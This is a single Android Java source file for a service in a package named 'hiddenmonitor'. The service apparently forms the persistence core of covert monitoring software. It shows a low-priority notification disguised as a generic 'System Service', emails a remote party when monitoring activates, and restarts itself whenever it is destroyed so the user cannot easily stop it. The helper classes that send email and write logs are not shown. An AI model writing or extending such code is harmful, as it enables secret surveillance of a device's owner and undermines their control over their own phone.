package com.example.hiddenmonitor;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;

public class MonitorService extends Service {
    
    private static final String CHANNEL_ID = "MonitorChannel";
    private static final int NOTIFICATION_ID = 1;
    private EmailSender emailSender;
    
    @Override
    public void onCreate() {
        super.onCreate();
        emailSender = new EmailSender(this);
        
        createNotificationChannel();
        startForeground();
        
        FileLogger.log(this, "Monitor service started");
        emailSender.sendEmail("Service Started", "Monitoring service activated");
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Monitor Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("System monitoring service");
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }
    
    private void startForeground() {
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
        
        startForeground(NOTIFICATION_ID, notification);
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Restart if killed
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        FileLogger.log(this, "Service destroyed - restarting");
        
        // Restart service
        Intent intent = new Intent(this, MonitorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
